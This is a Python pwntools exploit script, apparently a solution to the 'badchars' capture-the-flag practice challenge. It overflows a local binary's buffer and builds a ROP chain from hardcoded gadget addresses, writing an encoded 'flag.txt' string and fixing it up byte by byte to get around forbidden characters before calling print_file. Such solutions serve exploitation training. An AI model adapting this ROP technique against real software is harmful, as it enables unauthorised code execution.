from pwn import *
r=process('./badchars')
#gdb.attach(r, """break *0x0000000000400510""")
poprdi=0x00000000004006a3 #pop rdi ; ret
popr12r13r14r15=0x000000000040069c #pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
movr13r12=0x0000000000400634 #mov qword ptr [r13], r12 ; ret
subr15r14=0x0000000000400630 #sub byte ptr [r15], r14b ; ret
popr14r15=0x00000000004006a0 #pop r14 ; pop r15 ; ret
write_addr=0x0060102f
print_file=0x400510
payload="a"*40
#write
payload+=p64(popr12r13r14r15)+p64(u64('flbh/tyt'))+p64(write_addr)+p64(1)+p64(write_addr+3)+p64(movr13r12)
payload+=p64(subr15r14)
payload+=p64(popr14r15)+p64(1)+p64(write_addr+4)+p64(subr15r14)
payload+=p64(popr14r15)+p64(1)+p64(write_addr+6)+p64(subr15r14)
payload+=p64(popr14r15)+p64(1)+p64(write_addr+2)+p64(subr15r14)
payload+=p64(poprdi)+p64(write_addr)+p64(print_file)

r.recvuntil('> ')
r.sendline(payload)
r.interactive()